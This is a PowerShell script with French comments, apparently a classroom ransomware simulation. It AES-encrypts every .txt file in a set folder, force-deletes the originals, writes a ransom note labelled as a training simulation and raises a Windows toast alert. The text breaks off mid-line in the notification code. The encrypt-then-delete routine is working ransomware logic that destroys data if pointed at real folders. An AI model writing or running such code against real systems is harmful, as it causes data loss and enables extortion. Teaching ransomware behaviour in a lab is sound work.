$password = "TP2026"
$folder = "D:\Desktop\tp-simulation"

$sha = New-Object System.Security.Cryptography.SHA256Managed
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

# --- CHIFFREMENT ---
$files = Get-ChildItem $folder -File -Filter "*.txt"

foreach ($file in $files)
{
    $data = [System.IO.File]::ReadAllBytes($file.FullName)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $result = $aes.IV + $encryptedData
    $outputFile = $file.FullName + ".enc"
    [System.IO.File]::WriteAllBytes($outputFile, $result)
    Remove-Item $file.FullName -Force
    Write-Host "Chiffre :" $file.Name
}

# --- NOTE DE RANSON ---
$ransom = @"
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝

==========================================================
  VOS FICHIERS ONT ETE CHIFFRES - SIMULATION PEDAGOGIQUE
==========================================================

Tous vos fichiers .txt ont ete chiffres avec AES-256.
Les fichiers originaux ont ete supprimes.

Pour recuperer vos fichiers, vous devez entrer le mot de passe.

Lancez le script de dechiffrement et entrez le mot de passe.

----------------------------------------------------------
  CECI EST UNE SIMULATION - ENVIRONNEMENT DE FORMATION
----------------------------------------------------------
"@
$utf8Bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
Write-Host "Note de rancon creee : README_DECRYPT.txt"

# --- NOTIFICATION TOAST ---
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null

$template = [Windows.UI.Notifications.ToastTemplateType]::ToastText02
$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template)
$xml.GetElementsByTagName("text")[0].AppendChild(
    $xml.CreateTextNode("FICHIERS CHIFFRES")
) | Out-Null
$xml.GetElementsByTagName("text")[1].AppendChild(
    $xml.CreateTextNode("Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt")
) | Out-Null

$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
[Windows.UI.Notifications.Toast